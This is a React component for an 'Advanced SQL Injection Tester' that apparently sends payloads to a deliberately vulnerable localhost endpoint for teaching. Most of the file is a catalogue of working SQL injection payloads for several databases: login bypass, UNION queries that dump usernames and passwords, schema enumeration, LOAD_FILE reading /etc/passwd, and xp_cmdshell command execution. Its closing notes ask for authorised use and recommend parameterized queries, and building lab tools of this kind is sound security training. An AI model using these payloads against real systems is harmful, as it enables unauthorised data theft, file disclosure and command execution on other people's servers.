import { useState } from 'react';
import axios from 'axios';
import styles from './SQLInjection.module.css';

type Method = 'axios' | 'fetch';
type Database = 'postgresql' | 'mysql' | 'mssql' | 'oracle' | 'sqlite';
type Category = 'basic' | 'union' | 'blind';

const SQLInjection = () => {
  const [username, setUsername] = useState('');
  const [result, setResult] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [method, setMethod] = useState<Method>('axios');
  const [dbType, setDbType] = useState<Database>('postgresql');
  const [category, setCategory] = useState<Category>('basic');
  const [loading, setLoading] = useState(false);
  const [customPayload, setCustomPayload] = useState('');

  // Payloads organizados por categoría
  const payloadCategories: Record<
    Category,
    Array<{ label: string; value: string }>
  > = {
    basic: [
      { label: 'Empty', value: '' },
      { label: 'Normal User', value: 'admin' },
      { label: 'Always True (OR 1=1)', value: "' OR '1'='1" },
      { label: 'Always True (Basic)', value: "' OR 1=1 --" },
      { label: 'Comment abuse', value: "admin' --" },
    ],

    union: [
      {
        label: 'Union version (PG)',
        value: "' UNION SELECT NULL, version(), NULL --",
      },
      {
        label: 'Union current user (PG)',
        value: "' UNION SELECT NULL, current_user, NULL --",
      },
      {
        label: 'Union database (PG)',
        value: "' UNION SELECT NULL, current_database(), NULL --",
      },
      {
        label: 'List all tables (PG)',
        value:
          "' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog', 'information_schema') --",
      },
      {
        label: 'List all columns (PG)',
        value:
          "' UNION SELECT NULL, column_name || ': ' || data_type, NULL FROM information_schema.columns WHERE table_name='user' --",
      },
      {
        label: 'Extract all users (PG)',
        value:
          "' UNION SELECT NULL, username || ': ' || password, NULL FROM public.\"user\" --",
      },
      {
        label: 'Determine columns count',
        value: "' UNION SELECT NULL, NULL, NULL --",
      },
      {
        label: 'Extract admin password',
        value:
          "' UNION SELECT id, username, password FROM \"user\" WHERE username LIKE '%admin%' --",
      },
    ],

    blind: [
      {
        label: 'Boolean blind (PG)',
        value: "' AND SUBSTRING(version(),1,1)='P' --",
      },
    ],
  };

  // Payloads específicos por base de datos
  const dbSpecificPayloads: Record<
    Database,
    Array<{ label: string; value: string }>
  > = {
    postgresql: [
      { label: 'PG Version', value: "' UNION SELECT NULL, version(), NULL --" },
      {
        label: 'PG All Tables',
        value:
          "' UNION SELECT NULL, schemaname||'.'||tablename, NULL FROM pg_tables --",
      },
      {
        label: 'PG Current Query',
        value: "' UNION SELECT NULL, query, NULL FROM pg_stat_activity --",
      },
      {
        label: 'PG User Privileges',
        value: "' UNION SELECT NULL, usename, usesuper::text FROM pg_user --",
      },
    ],
    mysql: [
      {
        label: 'MySQL Version',
        value: "' UNION SELECT NULL, @@version, NULL --",
      },
      { label: 'MySQL User', value: "' UNION SELECT NULL, user(), NULL --" },
      {
        label: 'MySQL Databases',
        value:
          "' UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata --",
      },
      {
        label: 'MySQL Load File',
        value: '\' UNION SELECT NULL, LOAD_FILE("/etc/passwd"), NULL --',
      },
    ],
    mssql: [
      {
        label: 'MSSQL Version',
        value: "' UNION SELECT NULL, @@version, NULL --",
      },
      {
        label: 'MSSQL User',
        value: "' UNION SELECT NULL, SYSTEM_USER, NULL --",
      },
      {
        label: 'MSSQL Tables',
        value:
          "' UNION SELECT NULL, name, NULL FROM sysobjects WHERE xtype='U' --",
      },
      { label: 'MSSQL xp_cmdshell', value: "'; EXEC xp_cmdshell 'dir' --" },
    ],
    oracle: [
      {
        label: 'Oracle Version',
        value: "' UNION SELECT NULL, banner, NULL FROM v$version --",
      },
      {
        label: 'Oracle User',
        value: "' UNION SELECT NULL, user, NULL FROM dual --",
      },
      {
        label: 'Oracle Tables',
        value: "' UNION SELECT NULL, table_name, NULL FROM user_tables --",
      },
    ],
    sqlite: [
      {
        label: 'SQLite Version',
        value: "' UNION SELECT NULL, sqlite_version(), NULL --",
      },
      {
        label: 'SQLite Tables',
        value:
          "' UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' --",
      },
      {
        label: 'SQLite Schema',
        value: "' UNION SELECT sql, NULL FROM sqlite_master --",
      },
    ],
  };

  const handleTest = async () => {
    setLoading(true);
    setResult(null);
    setError(null);

    const payload = customPayload || username;
    const url = `http://localhost:3000/sql-injection/vulnerable?username=${encodeURIComponent(
      payload
    )}`;

    try {
      let data;
      if (method === 'axios') {
        const response = await axios.get(url);
        data = response.data;
      } else {
        const response = await fetch(url);
        if (!response.ok)
          throw new Error(`HTTP error! status: ${response.status}`);
        data = await response.json();
      }
      setResult(JSON.stringify(data, null, 2));
    } catch (err: any) {
      setError(err.message || 'An error occurred');
      if (axios.isAxiosError(err) && err.response) {
        setResult(JSON.stringify(err.response.data, null, 2));
      }
    } finally {
      setLoading(false);
    }
  };

  const handlePayloadClick = (value: string) => {
    setUsername(value);
    setCustomPayload(value);
  };

  const handleCustomPayloadTest = () => {
    if (customPayload) {
      setUsername(customPayload);
      handleTest();
    }
  };

  return (
    <div className={styles.sql}>
      {/* Header */}
      <header className={styles.sql__header}>
        <h1 className={styles.sql__title}>Advanced SQL Injection Tester</h1>
        <p className={styles.sql__subtitle}>
          Comprehensive SQL injection payload testing tool
        </p>
      </header>

      {/* Configuración */}
      <div className={styles.sql__config}>
        <div className={styles.sql__configGroup}>
          <label className={styles.sql__configLabel}>HTTP Method</label>
          <div className={styles.sql__methodButtons}>
            {(['axios', 'fetch'] as Method[]).map((m) => (
              <button
                key={m}
                className={`${styles.sql__methodButton} ${
                  method === m ? styles['sql__methodButton--active'] : ''
                }`}
                onClick={() => setMethod(m)}
              >
                {m.charAt(0).toUpperCase() + m.slice(1)}
              </button>
            ))}
          </div>
        </div>

        <div className={styles.sql__configGroup}>
          <label className={styles.sql__configLabel}>Database Type</label>
          <select
            value={dbType}
            onChange={(e) => setDbType(e.target.value as Database)}
            className={styles.sql__select}
          >
            {Object.keys(dbSpecificPayloads).map((db) => (
              <option key={db} value={db}>
                {db.charAt(0).toUpperCase() + db.slice(1)}
              </option>
            ))}
          </select>
        </div>

        <div className={styles.sql__configGroup}>
          <label className={styles.sql__configLabel}>Payload Category</label>
          <select
            value={category}
            onChange={(e) => setCategory(e.target.value as Category)}
            className={styles.sql__select}
          >
            {Object.keys(payloadCategories).map((cat) => (
              <option key={cat} value={cat}>
                {cat.charAt(0).toUpperCase() + cat.slice(1).replace('-', ' ')}
              </option>
            ))}
          </select>
        </div>
      </div>

      {/* Input principal */}
      <div className={styles.sql__inputGroup}>
        <label className={styles.sql__inputLabel}>Username / Payload</label>
        <input
          type='text'
          className={styles.sql__input}
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          placeholder='Enter username or SQL injection payload...'
        />
      </div>

      {/* Payloads por categoría */}
      <div className={styles.sql__payloads}>
        <h3 className={styles.sql__payloadsTitle}>
          {category.charAt(0).toUpperCase() +
            category.slice(1).replace('-', ' ')}{' '}
          Payloads
        </h3>
        <div className={styles.sql__payloadGrid}>
          {payloadCategories[category].map((p) => (
            <button
              key={p.label}
              onClick={() => handlePayloadClick(p.value)}
              className={styles.sql__payloadButton}
            >
              {p.label}
            </button>
          ))}
        </div>
      </div>

      {/* Payloads específicos de BD */}
      <div className={styles.sql__payloads}>
        <h3 className={styles.sql__payloadsTitle}>
          {dbType.charAt(0).toUpperCase() + dbType.slice(1)} Specific Payloads
        </h3>
        <div className={styles.sql__payloadGrid}>
          {dbSpecificPayloads[dbType].map((p) => (
            <button
              key={p.label}
              onClick={() => handlePayloadClick(p.value)}
              className={`${styles.sql__payloadButton} ${styles['sql__payloadButton--db']}`}
            >
              {p.label}
            </button>
          ))}
        </div>
      </div>

      {/* Payload personalizado */}
      <div className={styles.sql__customPayload}>
        <h3 className={styles.sql__payloadsTitle}>Custom Payload</h3>
        <div className={styles.sql__customPayloadContent}>
          <textarea
            value={customPayload}
            onChange={(e) => setCustomPayload(e.target.value)}
            placeholder='Enter custom SQL injection payload...'
            className={styles.sql__textarea}
          />
          <button
            onClick={handleCustomPayloadTest}
            disabled={!customPayload.trim()}
            className={styles.sql__customPayloadButton}
          >
            Test Custom Payload
          </button>
        </div>
      </div>

      {/* Botón de prueba */}
      <div className={styles.sql__actionContainer}>
        <button
          className={styles.sql__actionButton}
          onClick={handleTest}
          disabled={loading || (!username.trim() && !customPayload.trim())}
        >
          {loading ? 'Testing...' : 'Test Payload'}
        </button>
      </div>

      {/* Resultados */}
      {(result || error) && (
        <div className={styles.sql__results}>
          <div className={styles.sql__resultsHeader}>
            <h3 className={styles.sql__resultsTitle}>
              Response{' '}
              <span className={styles.sql__resultsMethod}>({method})</span>
            </h3>
            <button
              onClick={() => {
                setResult(null);
                setError(null);
              }}
              className={styles.sql__clearButton}
            >
              Clear
            </button>
          </div>

          {error && (
            <div className={styles.sql__error}>
              <div className={styles.sql__errorTitle}>Error:</div>
              <div className={styles.sql__errorText}>{error}</div>
            </div>
          )}

          {result && (
            <div className={styles.sql__resultBox}>
              <pre>{result}</pre>
            </div>
          )}
        </div>
      )}

      {/* Información de seguridad */}
      <div className={styles.sql__security}>
        <h4 className={styles.sql__securityTitle}>
          <span>⚠️</span> Security Notes
        </h4>
        <ul className={styles.sql__securityList}>
          <li className={styles.sql__securityItem}>
            Only test against applications you own or have permission to test
          </li>
          <li className={styles.sql__securityItem}>
            This tool is for educational purposes only
          </li>
          <li className={styles.sql__securityItem}>
            Always use parameterized queries or prepared statements in
            production
          </li>
          <li className={styles.sql__securityItem}>
            Implement proper input validation and sanitization
          </li>
          <li className={styles.sql__securityItem}>
            Use a WAF (Web Application Firewall) for additional protection
          </li>
          <li className={styles.sql__securityItem}>
            Regular security audits are recommended
          </li>
        </ul>
      </div>
    </div>
  );
};

export default SQLInjection;
